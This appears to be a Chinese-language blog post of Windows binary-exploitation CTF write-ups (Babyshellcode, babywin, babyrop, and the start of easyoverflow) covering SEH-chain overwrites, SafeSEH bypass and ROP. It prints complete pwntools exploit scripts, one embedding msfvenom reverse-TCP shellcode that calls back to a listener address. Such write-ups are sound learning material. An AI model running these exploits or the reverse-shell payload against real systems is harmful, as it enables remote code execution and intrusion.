+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206000424119.png" srcset="/img/loading.gif" lazyload alt="image-20240206000424119"></p>
+<h3 id="HITB-GSEC-Babyshellcode"><a href="#HITB-GSEC-Babyshellcode" class="headerlink" title="HITB GSEC Babyshellcode"></a>HITB GSEC Babyshellcode</h3><p>查看保护，保护几乎全开。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206000648008.png" srcset="/img/loading.gif" lazyload alt="image-20240206000648008"></p>
+<p>注意关闭程序ASLR再进行调试。</p>
+<p><code>sub_401590</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001423546.png" srcset="/img/loading.gif" lazyload alt="image-20240206001423546"></p>
+<p><code>init_scmgr</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001552448.png" srcset="/img/loading.gif" lazyload alt="image-20240206001552448"></p>
+<p>调用<code>VirtualAlloc </code>函数分配一段内存，然后打印出分配的内存地址。</p>
+<p>这里<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a>中有一个参数是flprotect，值是0x40，表示拥有RWE权限。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_EXECUTE_READWRITE 0x40</span><br></code></pre></td></tr></table></figure>
+
+<p><code>main</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001825423.png" srcset="/img/loading.gif" lazyload alt="image-20240206001825423"></p>
+<p>这里存在一个栈溢出，可以用来泄露关键内容。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206001943300.png" srcset="/img/loading.gif" lazyload alt="image-20240206001943300"></p>
+<p>然后给出一个菜单选项功能，其中漏洞点在Run Shellcode功能中。</p>
+<p><code>run_shellcode</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002112658.png" srcset="/img/loading.gif" lazyload alt="image-20240206002112658"></p>
+<p>这里存在一个栈溢出，然后执行shellcode。由于会把shellcode起始字节修改为-1，也即0xffffffff，这里存在非法地址访问(执行)的错误，会触发错误处理。</p>
+<p>如何利用呢？</p>
+<p>这里使用OD插件，可以看到scmgr.dll没有开启SafeSEH保护。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002510104.png" srcset="/img/loading.gif" lazyload alt="image-20240206002510104"></p>
+<p>同时，我们在scmgr.dll模块中看到了后门函数<code>getshell_test</code> 。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206002621932.png" srcset="/img/loading.gif" lazyload alt="image-20240206002621932"></p>
+<p>所以这里思路就很明朗，覆盖SEH Handler为未开启SafeSEH的scmgr.dll的<code>getshell_test</code> 即可。</p>
+<p>这里我们需要做的一点就是泄露SEH next（win10后添加的<code>ntdll!RtlpIsValidExceptionChain</code>，必须具有合法的next地址），以及scmgr.dll模块的加载地址。</p>
+<p>SEH next在栈上，可以通过一开始的栈溢出泄露出来，主要难点就是泄露scmgr.dll基地址。但是注意到程序一开始将<code>init_scmgr</code> 存放到全局变量中，然后<strong>Set ShellcodeGuard</strong>功能中对全局变量进行加密，然后打印出加密结果。就可以想到，解密得到scmgr.dll基地址或者通过模拟加密流程爆破出scmgr.dll的基地址。这里题目提示加密算法不可逆，所以只能爆破。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206003416496.png" srcset="/img/loading.gif" lazyload alt="image-20240206003416496"></p>
+<p>调试过程如下：</p>
+<p>伪造前的SEH链</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240201204441552.png" srcset="/img/loading.gif" lazyload alt="image-20240201204441552"></p>
+<p>伪造后的SEH链</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240201191320432.png" srcset="/img/loading.gif" lazyload alt="image-20240201191320432"></p>
+<p>最终wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;192.168.0.190&#x27;</span>, <span class="hljs-number">1234</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Create</span>(<span class="hljs-params">size, name, des, shellcode</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Option:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;shellcode size:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;shellcode name:\r\n&#x27;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">&#x27;shellcode description:\r\n&#x27;</span>)<br>    p.sendline(des)<br>    p.recvuntil(<span class="hljs-string">&#x27;shellcode:\r\n&#x27;</span>)<br>    p.sendline(shellcode)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Run</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Option:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;shellcode index:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_scmgr_base</span>(<span class="hljs-params">check</span>):<br>    <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x60000000</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-number">0x10000</span>):<br>        init_scmgr = base + <span class="hljs-number">0x1090</span><br>        <span class="hljs-comment"># lg(&#x27;init_scmgr&#x27;, init_scmgr)</span><br>        g_table = [init_scmgr]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>):<br>            init_scmgr = (init_scmgr * <span class="hljs-number">69069</span>) &amp; <span class="hljs-number">0xffffffff</span><br>            g_table.append(init_scmgr)<br>        g_index = <span class="hljs-number">0</span><br>        v0 = (g_index-<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x1f</span><br>        v2 = g_table[(g_index + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x1f</span>] ^ g_table[g_index] ^ (g_table[(g_index + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x1f</span>] &gt;&gt; <span class="hljs-number">8</span>)<br>        v1 = g_table[v0]<br>        v3 = g_table[(g_index + <span class="hljs-number">10</span>) &amp; <span class="hljs-number">0x1F</span>]<br>        v4 = g_table[(g_index - <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x1F</span>] ^ v3 ^ ((v3 ^ (<span class="hljs-number">32</span> * g_table[(g_index - <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x1F</span>])) &lt;&lt; <span class="hljs-number">14</span>)<br>        v4 = v4 &amp; <span class="hljs-number">0xffffffff</span><br>        g_table[g_index] = v2 ^ v4<br>        g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (<span class="hljs-number">16</span> * (v1 ^ <span class="hljs-number">4</span> * v4))) &lt;&lt; <span class="hljs-number">7</span>)) &amp; <span class="hljs-number">0xffffffff</span><br>        g_index = (g_index - <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x1F</span><br><br>        <span class="hljs-keyword">if</span>(g_table[g_index] == check):<br>            lg(<span class="hljs-string">&#x27;base&#x27;</span>, base)<br>            <span class="hljs-keyword">return</span> base + <span class="hljs-number">0x1100</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shellcodeguard</span>(<span class="hljs-params">option</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Option:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Option:\r\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(option))<br>    p.recvuntil(<span class="hljs-string">&#x27;our challenge code is &#x27;</span>)<br>    challengde_code = p.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>)[:-<span class="hljs-number">2</span>].decode()<br>    <span class="hljs-built_in">print</span>(challengde_code)<br>    check = <span class="hljs-built_in">int</span>(challengde_code.split(<span class="hljs-string">&#x27;-&#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(check)<br>    backdoor = get_scmgr_base(check)<br>    p.recvuntil(<span class="hljs-string">&#x27;challenge response:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> backdoor<br><br><br>pause()<br><br>p.recvuntil(<span class="hljs-string">&#x27;Global memory alloc at &#x27;</span>)<br>heap = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;leave your name&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x8</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0x8</span>)<br>seh_next = u32(p.recv(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;seh_next&#x27;</span>, seh_next)<br><br>system_addr = shellcodeguard(<span class="hljs-number">1</span>)<br>lg(<span class="hljs-string">&#x27;system_addr&#x27;</span>, system_addr)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x70</span> + p32(seh_next) + p32(system_addr) + p32(<span class="hljs-number">0</span>)<br>Create(<span class="hljs-built_in">len</span>(payload), <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, payload)<br><br>Run(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206151216330.png" srcset="/img/loading.gif" lazyload alt="image-20240206151216330"></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206151252996.png" srcset="/img/loading.gif" lazyload alt="image-20240206151252996"></p>
+<p>这个是有一定概率的，不是百分百成功，挺奇怪的。。。</p>
+<h3 id="2024-西湖论剑-babywin"><a href="#2024-西湖论剑-babywin" class="headerlink" title="2024 西湖论剑 babywin"></a>2024 西湖论剑 babywin</h3><p>查看保护。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206004833315.png" srcset="/img/loading.gif" lazyload alt="image-20240206004833315"></p>
+<p>没有开启NX与ASLR，开启了SafeSEH。</p>
+<p>程序也很简单。</p>
+<p><code>sub_401060</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206005016234.png" srcset="/img/loading.gif" lazyload alt="image-20240206005016234"></p>
+<p><code>sub_4010E0</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206005047214.png" srcset="/img/loading.gif" lazyload alt="image-20240206005047214"></p>
+<p><code>sub_4010E0</code> 函数存在栈溢出，但是程序没有显式的泄露地址，也无法泄露出地址，所以这里几乎没办法过掉Canary保护，那就只能走SEH链了。</p>
+<p>这里无法泄露出任何地址，也就无法泄露出SEH Next的值了，猜测是运行在Win7上的程序。这里可以通过<code>strcat</code> 函数非法访问触发错误处理。</p>
+<p>这里可以使用上述SafeSEH利用方法的第3种，覆盖SEH Handler为<code>pop; pop; ret</code> 类似的gadget，从而执行shellcode。<code>gift</code> 函数提供了类似的gadget，所以这里直接打shellcode就好。</p>
+<p>调试过程如下：</p>
+<p>执行完<code>strcpy</code>，程序栈帧布局。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206010439612.png" srcset="/img/loading.gif" lazyload alt="image-20240206010439612"></p>
+<p>错误处理后的栈帧。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206010930889.png" srcset="/img/loading.gif" lazyload alt="image-20240206010930889"></p>
+<p>成功执行shellcode。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011008164.png" srcset="/img/loading.gif" lazyload alt="image-20240206011008164"></p>
+<p>最终wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;192.168.126.159&quot;</span>, <span class="hljs-number">1234</span>)<br><br><span class="hljs-comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.190 LPORT=1234 -f py -b &#x27;\x0a\x00&#x27;</span><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\xbd\xf8\xb9\xae\xce\xdb\xc4\xd9\x74\x24\xf4\x5a&quot;</span><br>buf += <span class="hljs-string">b&quot;\x31\xc9\xb1\x59\x83\xc2\x04\x31\x6a\x10\x03\x6a&quot;</span><br>buf += <span class="hljs-string">b&quot;\x10\x1a\x4c\x52\x26\x55\xaf\xab\xb7\x09\x39\x4e&quot;</span><br>buf += <span class="hljs-string">b&quot;\x86\x1b\x5d\x1a\xbb\xab\x15\x4e\x30\x40\x7b\x7b&quot;</span><br>buf += <span class="hljs-string">b&quot;\x79\xa9\x73\x34\x33\x73\x07\x48\xec\x4a\xd7\x01&quot;</span><br>buf += <span class="hljs-string">b&quot;\xd0\xcd\xab\x5b\x05\x2d\x95\x93\x58\x2c\xd2\x65&quot;</span><br>buf += <span class="hljs-string">b&quot;\x16\xc1\x8e\x22\x53\x4f\x3f\x46\x21\x53\x3e\x88&quot;</span><br>buf += <span class="hljs-string">b&quot;\x2d\xeb\x38\xad\xf2\x9f\xf4\xac\x22\xd4\x5d\x8f&quot;</span><br>buf += <span class="hljs-string">b&quot;\x92\xeb\x8e\x44\x5a\xf3\xb5\x92\x2f\x3f\xff\xaf&quot;</span><br>buf += <span class="hljs-string">b&quot;\xe4\xb4\xce\x50\x05\x1c\x01\x6f\xc7\x6f\x6f\xc3&quot;</span><br>buf += <span class="hljs-string">b&quot;\xc9\xa8\x48\xfb\xbf\xc2\xaa\x86\xc7\x11\xd0\x5c&quot;</span><br>buf += <span class="hljs-string">b&quot;\x4d\x85\x72\x16\xf5\x61\x82\xfb\x60\xe2\x88\xb0&quot;</span><br>buf += <span class="hljs-string">b&quot;\xe7\xac\x8c\x47\x2b\xc7\xa9\xcc\xca\x07\x38\x96&quot;</span><br>buf += <span class="hljs-string">b&quot;\xe8\x83\x60\x4c\x90\x92\xcc\x23\xad\xc4\xa9\x9c&quot;</span><br>buf += <span class="hljs-string">b&quot;\x0b\x8f\x58\xca\x2c\x70\xa3\xf3\x70\xe6\x6f\x3e&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8b\xf6\xe7\x49\xf8\xc4\xa8\xe1\x96\x64\x20\x2c&quot;</span><br>buf += <span class="hljs-string">b&quot;\x60\xfd\x26\xcf\xbe\x45\x26\x31\x3f\xb5\x6e\xf6&quot;</span><br>buf += <span class="hljs-string">b&quot;\x6b\xe5\x18\xdf\x13\x6e\xd9\xe0\xc1\x1a\xd3\x76&quot;</span><br>buf += <span class="hljs-string">b&quot;\x2a\x72\xe3\x38\xc2\x80\xe4\x40\xc1\x0d\x02\x18&quot;</span><br>buf += <span class="hljs-string">b&quot;\xb5\x5d\x9b\xd9\x65\x1d\x4b\xb2\x6f\x92\xb4\xa2&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8f\x79\xdd\x49\x60\xd7\xb5\xe5\x19\x72\x4d\x97&quot;</span><br>buf += <span class="hljs-string">b&quot;\xe6\xa9\x2b\x97\x6d\x5b\xcb\x56\x86\x2e\xdf\x8f&quot;</span><br>buf += <span class="hljs-string">b&quot;\xf1\xd0\x1f\x50\x94\xd0\x75\x54\x3e\x87\xe1\x56&quot;</span><br>buf += <span class="hljs-string">b&quot;\x67\xef\xad\xa9\x42\x6c\xa9\x56\x13\x44\xc1\x61&quot;</span><br>buf += <span class="hljs-string">b&quot;\x81\xe8\xbd\x8d\x45\xe8\x3d\xd8\x0f\xe8\x55\xbc&quot;</span><br>buf += <span class="hljs-string">b&quot;\x6b\xbb\x40\xc3\xa1\xa8\xd8\x56\x4a\x98\x8d\xf1&quot;</span><br>buf += <span class="hljs-string">b&quot;\x22\x26\xeb\x36\xed\xd9\xde\x44\xea\x25\x9c\x62&quot;</span><br>buf += <span class="hljs-string">b&quot;\x53\x4d\x5e\x33\x63\x8d\x34\xb3\x33\xe5\xc3\x9c&quot;</span><br>buf += <span class="hljs-string">b&quot;\xbc\xc5\x2c\x37\x95\x4d\xa6\xd6\x57\xec\xb7\xf2&quot;</span><br>buf += <span class="hljs-string">b&quot;\x36\xb0\xb8\xf1\xe2\x43\xc2\x7a\x14\xa4\x33\x93&quot;</span><br>buf += <span class="hljs-string">b&quot;\x71\xa5\x33\x9b\x87\x9a\xe5\xa2\xfd\xdd\x35\x91&quot;</span><br>buf += <span class="hljs-string">b&quot;\x0e\x68\x1b\xb0\x84\x92\x0f\xc2\x8c&quot;</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-string">b&#x27;\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> buf)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov ebx,0xffffffff</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov edi,0xffbfdf43</span><br><span class="hljs-string">xor edi,ebx</span><br><span class="hljs-string">push ecx</span><br><span class="hljs-string">call [edi]  ; call __acrt_iob_func(0)</span><br><span class="hljs-string">mov edi,0xffbfdf3f</span><br><span class="hljs-string">xor edi,ebx</span><br><span class="hljs-string">push eax</span><br><span class="hljs-string">mov esi,0xfffff9ff</span><br><span class="hljs-string">xor esi,ebx</span><br><span class="hljs-string">push esi</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">call [edi]  ; call fgets(esp, 0x600, stdin)</span><br><span class="hljs-string">pop esi</span><br><span class="hljs-string">jmp esp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = <span class="hljs-string">b&#x27;&#x27;&#x27;\xbb\xff\xff\xff\xff1\xc9\xbfC\xdf\xbf\xff1\xdfQ\xff\x17\xbf?\xdf\xbf\xff1\xdfP\xbe\xff\xfb\xff\xff1\xdeVT\xff\x17^\xff\xe4&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-string">b&#x27;\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> shellcode <span class="hljs-keyword">and</span> <span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> shellcode)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(shellcode) &lt; <span class="hljs-number">120</span>)<br><br>pop2 = <span class="hljs-number">0x271f16ac</span>   <span class="hljs-comment"># pop ecx ; pop ebp ; ret</span><br>payload = shellcode.ljust(<span class="hljs-number">120</span>, <span class="hljs-string">b&#x27;\xAA&#x27;</span>) + <span class="hljs-string">b&#x27;\xeb\x86\xAA\xAA&#x27;</span> + p32(pop2) + <span class="hljs-string">b&#x27;cmd.exe&#x27;</span><br><br>pause()<br>p.sendlineafter(<span class="hljs-string">b&#x27;data:&#x27;</span>, payload)<br><br>pause()<br>p.sendline(buf)<br><br>p.interactive()  <br></code></pre></td></tr></table></figure>
+
+<p>不知道为什么，每次执行shellcode，win7都报程序错误而无法反弹shell，有点怪。。。</p>
+<h3 id="buuctf-babyrop"><a href="#buuctf-babyrop" class="headerlink" title="buuctf-babyrop"></a>buuctf-babyrop</h3><p>查看保护。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011251041.png" srcset="/img/loading.gif" lazyload alt="image-20240206011251041"></p>
+<p>保护基本全开。</p>
+<p>程序很简单，就是基本的windows ROP。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206011537354.png" srcset="/img/loading.gif" lazyload alt="image-20240206011537354"></p>
+<p>利用思路：</p>
+<ol>
+<li>泄露dll基地址</li>
+<li>ROP执行<code>system(&quot;cmd.exe&quot;)</code></li>
+</ol>
+<p>调试过程：</p>
+<p>这里主要是演示如何查找符号，以及字符串。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240202152944501.png" srcset="/img/loading.gif" lazyload alt="image-20240202152944501"></p>
+<p>最终wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;192.168.0.190&#x27;</span>, <span class="hljs-number">1234</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>pause()<br><br>p.sendafter(<span class="hljs-string">&#x27;your name&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">99</span> + <span class="hljs-string">b&#x27;@&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;@&#x27;</span>)<br>msvcr100_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1163d</span><br>lg(<span class="hljs-string">&#x27;msvcr100_base&#x27;</span>, msvcr100_base)<br>stack_addr = u32(p.recv(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>, stack_addr)<br><br>system = msvcr100_base + <span class="hljs-number">0x61632</span><br>cmd = msvcr100_base + <span class="hljs-number">0x42030</span><br>lg(<span class="hljs-string">&#x27;system&#x27;</span>, system)<br>lg(<span class="hljs-string">&#x27;cmd&#x27;</span>, cmd)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0xcc</span>: [<br>            <span class="hljs-number">0</span>, system, <span class="hljs-number">0</span>, cmd<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>p.sendlineafter(<span class="hljs-string">&#x27;your message length&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206012036671.png" srcset="/img/loading.gif" lazyload alt="image-20240206012036671"></p>
+<h3 id="2020-qwb-easyoverflow"><a href="#2020-qwb-easyoverflow" class="headerlink" title="2020 qwb easyoverflow"></a>2020 qwb easyoverflow</h3><p>查看保护。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206014742407.png" srcset="/img/loading.gif" lazyload alt="image-20240206014742407"></p>
+<p>保护基本全开。</p>
+<p>需要注意的是，当关闭ASLR时，程序无法正常运行，这里直接进行调试。</p>
+<p><code>main</code></p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206015115496.png" srcset="/img/loading.gif" lazyload alt="image-20240206015115496"></p>
+<p>存在三次机会栈溢出以及任意地址泄露。</p>
+<p>这里看下程序如何生成canary的。</p>
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206015320731.png" srcset="/img/loading.gif" lazyload alt="image-20240206015320731"></p>
